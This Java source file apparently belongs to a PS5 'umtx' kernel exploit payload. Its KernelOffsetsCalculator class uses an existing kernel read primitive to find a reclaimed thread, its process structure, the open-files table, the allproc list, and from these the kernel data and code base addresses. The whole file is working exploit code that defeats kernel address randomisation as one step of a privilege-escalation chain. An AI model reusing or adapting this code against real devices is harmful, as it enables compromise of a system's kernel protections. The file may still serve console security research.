package org.ps5jb.client.payloads.umtx.common;

import org.ps5jb.sdk.include.machine.VmParam;
import org.ps5jb.sdk.core.SdkSoftwareVersionUnsupportedException;
import org.ps5jb.sdk.core.kernel.KernelOffsets;
import java.nio.charset.Charset;
import org.ps5jb.sdk.core.kernel.KernelPointer;

public class KernelOffsetsCalculator
{
    private static final long OFFSET_THREAD_TD_NAME = 660L;
    private static final long OFFSET_THREAD_TD_PROC = 8L;
    private static final long OFFSET_FDESCENTTBL_FDT_OFILES = 8L;
    public static final int MAX_RECLAIM_THREAD_NAME = 16;
    public static final int DEFAULT_KERNEL_THREAD_POINTER_OCCURRENCE_THRESHOLD = 10;
    public KernelPointer kernelAddressBase;
    public KernelPointer kernelDataBase;
    public KernelPointer threadAddress;
    public KernelPointer processAddress;
    public KernelPointer allProcAddress;
    public KernelPointer processOpenFilesAddress;
    
    public KernelOffsetsCalculator() {
        this.kernelAddressBase = KernelPointer.NULL;
        this.kernelDataBase = KernelPointer.NULL;
        this.threadAddress = KernelPointer.NULL;
        this.processAddress = KernelPointer.NULL;
        this.allProcAddress = KernelPointer.NULL;
        this.processOpenFilesAddress = KernelPointer.NULL;
    }
    
    public boolean calculate(final int swVer, final KernelAddressClassifier classifier, final String reclaimThreadName) {
        boolean result = false;
        final Long potentialThreadAddress = classifier.getMostOccuredHeapAddress(10);
        if (potentialThreadAddress != null) {
            final KernelPointer threadAddressPtr = KernelPointer.valueOf(potentialThreadAddress);
            final String threadNameCheck = threadAddressPtr.readString(660L, new Integer(15), Charset.defaultCharset().name());
            if (threadNameCheck.equals((Object)reclaimThreadName)) {
                this.threadAddress = threadAddressPtr;
                this.processAddress = KernelPointer.valueOf(this.threadAddress.read8(8L));
                final KernelPointer p_fd = KernelPointer.valueOf(this.processAddress.read8(72L));
                this.processOpenFilesAddress = KernelPointer.valueOf(p_fd.read8() + 8L);
                this.allProcAddress = this.calculateAllProcAddress(this.processAddress);
                try {
                    final KernelOffsets kernelOffsets = new KernelOffsets(swVer);
                    this.kernelDataBase = this.allProcAddress.inc(-kernelOffsets.OFFSET_KERNEL_DATA_BASE_ALLPROC);
                    this.kernelAddressBase = this.kernelDataBase.inc(-kernelOffsets.OFFSET_KERNEL_DATA);
                }
                catch (final SdkSoftwareVersionUnsupportedException ex) {}
                result = true;
            }
        }
        return result;
    }
    
    private KernelPointer calculateAllProcAddress(final KernelPointer processAddress) {
        KernelPointer allproc = processAddress;
        final long KDATA_MASK = VmParam.VM_MIN_KERNEL_ADDRESS;
        while (!KernelPointer.NULL.equals(allproc) && (allproc.addr() & KDATA_MASK) != KDATA_MASK) {
            try {
                allproc = KernelPointer.valueOf(allproc.read8(8L));
            }
            catch (final IllegalAccessError e) {
                allproc = KernelPointer.NULL;
            }
        }
        return allproc;
    }
}
